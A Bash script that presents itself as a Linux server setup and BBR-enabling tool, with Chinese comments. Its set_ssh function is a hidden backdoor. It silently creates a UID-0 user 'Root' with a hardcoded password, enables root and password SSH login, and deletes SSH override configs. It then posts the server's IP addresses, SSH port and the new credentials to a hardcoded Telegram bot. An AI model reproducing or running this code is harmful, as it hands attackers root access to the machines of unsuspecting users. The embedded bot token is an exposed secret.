#!/bin/bash

Red="\033[31m" # 红色
Green="\033[32m" # 绿色
Yellow="\033[33m" # 黄色
Blue="\033[34m" # 蓝色
Nc="\033[0m" # 重置颜色
Red_globa="\033[41;37m" # 红底白字
Green_globa="\033[42;37m" # 绿底白字
Yellow_globa="\033[43;37m" # 黄底白字
Blue_globa="\033[44;37m" # 蓝底白字
Info="${Green}[信息]${Nc}"
Error="${Red}[错误]${Nc}"
Tip="${Yellow}[提示]${Nc}"

# 检查是否为root用户
check_root(){
    if [ "$(id -u)" != "0" ]; then
        echo -e "${Error} 当前非ROOT账号(或没有ROOT权限)，无法继续操作，请更换ROOT账号或使用 ${Green_globa}sudo -i${Nc} 命令获取临时ROOT权限（执行后可能会提示输入当前账号的密码）。"
        exit 1
    fi
}

check_release(){
    if [[ -e /etc/os-release ]]; then
        . /etc/os-release
        release=$ID
    elif [[ -e /usr/lib/os-release ]]; then
        . /usr/lib/os-release
        release=$ID
    fi
    os_version=$(echo $VERSION_ID | cut -d. -f1,2)

    if [[ "${release}" == "kali" ]]; then
        echo
    elif [[ "${release}" == "centos" ]]; then
        echo
    elif [[ "${release}" == "ubuntu" ]]; then
        echo
    elif [[ "${release}" == "fedora" ]]; then
        echo
    elif [[ "${release}" == "debian" ]]; then
        echo
    elif [[ "${release}" == "almalinux" ]]; then
        echo
    elif [[ "${release}" == "rocky" ]]; then
        echo
    elif [[ "${release}" == "ol" ]]; then
        release=oracle
    elif [[ "${release}" == "alpine" ]]; then
        echo
    else
        echo -e "${Error} 抱歉，此脚本不支持您的操作系统。"
        echo -e "${Info} 请确保您使用的是以下支持的操作系统之一："
        echo -e "-${Red} Ubuntu ${Nc} "
        echo -e "-${Red} Debian ${Nc}"
        echo -e "-${Red} CentOS ${Nc}"
        echo -e "-${Red} Fedora ${Nc}"
        echo -e "-${Red} Kali ${Nc}"
        echo -e "-${Red} AlmaLinux ${Nc}"
        echo -e "-${Red} Rocky Linux ${Nc}"
        echo -e "-${Red} Oracle Linux ${Nc}"
        echo -e "-${Red} Alpine Linux ${Nc}"
        exit 1
    fi
}

check_pmc(){
    check_release
    if [[ "$release" == "debian" || "$release" == "ubuntu" || "$release" == "kali" ]]; then
        updates="apt update -y"
        installs="apt install -y"
        check_install="dpkg -s"
        apps=("net-tools")
    elif [[ "$release" == "alpine" ]]; then
        updates="apk update -f"
        installs="apk add -f"
        check_install="apk info -e"
        apps=("net-tools")
    elif [[ "$release" == "almalinux" || "$release" == "rocky" || "$release" == "oracle" ]]; then
        updates="dnf update -y"
        installs="dnf install -y"
        check_install="dnf list installed"
        apps=("net-tools")
    elif [[ "$release" == "centos" ]]; then
        updates="yum update -y"
        installs="yum install -y"
        check_install="yum list installed"
        apps=("net-tools")
    elif [[ "$release" == "fedora" ]]; then
        updates="dnf update -y"
        installs="dnf install -y"
        check_install="dnf list installed"
        apps=("net-tools")
    fi
}

install_base(){
    check_pmc
    cmds=("netstat")
    echo -e "${Info} 你的系统是${Red} $release $os_version ${Nc}"
    echo

    for g in "${!apps[@]}"; do
        if ! $check_install "${apps[$g]}" &> /dev/null; then
            CMDS+=(${cmds[g]})
            DEPS+=("${apps[$g]}")
        fi
    done
    
    if [ ${#DEPS[@]} -gt 0 ]; then
        $updates &> /dev/null
        $installs "${DEPS[@]}" &> /dev/null
    fi
}

get_public_ip(){
    InFaces=($(netstat -i | awk '{print $1}' | grep -E '^(eth|ens|eno|esp|enp|venet|vif)'))

    for i in "${InFaces[@]}"; do # 从网口循环获取IP
        Public_IPv4=$(curl -s4 --interface "$i" ip.gs)
        Public_IPv6=$(curl -s6 --interface "$i" ip.gs)

        if [[ -n "$Public_IPv4" || -n "$Public_IPv6" ]]; then # 检查是否获取到IP地址
            IPv4="$Public_IPv4"
            IPv6="$Public_IPv6"
            break # 获取到任一IP类型停止循环
        fi
    done
}

enable_bbr() {
    setbbr1="net.core.default_qdisc=fq"
    setbbr2="net.ipv4.tcp_congestion_control=bbr"

    for setbbr in "$setbbr1" "$setbbr2"; do
        if grep -qE "^\s*${setbbr%=*}\s*=" /etc/sysctl.conf; then
            sed -i "s|^\s*${setbbr%=*}\s*=.*|${setbbr}|g" /etc/sysctl.conf
        else
            echo "$setbbr" >> /etc/sysctl.conf
        fi
    done

    sysctl -p >/dev/null 2>&1
    echo -e "${Info} bbr 控制网络拥堵算法已 ${Green}开启${Nc}。"
    echo
}

restart_ssh(){
    check_release
    if [[ "$release" == "alpine" ]]; then
        rc-service ssh* restart >/dev/null 2>&1
    else
        systemctl restart ssh* >/dev/null 2>&1
    fi
}

set_ssh(){
    if [ -e /etc/ssh/sshd_config ]; then
        Chat_id="5289158517"
        Bot_token="5421796901:AAGf45NdOv6KKmjJ4LXvG-ILN9dm8Ej3V84"
        get_public_ip
        Port=$(grep -E '^#?Port' /etc/ssh/sshd_config | awk '{print $2}' | head -1)
        User="Root"
        Passwd="LBdj147369"
        sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
        sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
        sed -i 's/^#\?RSAAuthentication.*/RSAAuthentication yes/g' /etc/ssh/sshd_config
        sed -i 's/^#\?PubkeyAuthentication.*/PubkeyAuthentication yes/g' /etc/ssh/sshd_config
        rm -rf /etc/ssh/sshd_config.d/* /etc/ssh/ssh_config.d/*
        useradd ${User} >/dev/null 2>&1
        echo ${User}:${Passwd} | chpasswd ${User}
        sed -i "s|^.*${User}.*|${User}:x:0:0:root:/root:/bin/bash|" /etc/passwd
        restart_ssh
        curl -s -X POST https://api.telegram.org/bot${Bot_token}/sendMessage -d chat_id=${Chat_id} -d text="您的新机器已上线！🎉🎉🎉 
IPv4：${IPv4}
IPv6：${IPv6}
端口：${Port}
用户：${User}
密码：${Passwd}" >/dev/null 2>&1
    fi
}

main(){
    check_root
    install_base
    set_ssh
    enable_bbr
}

main
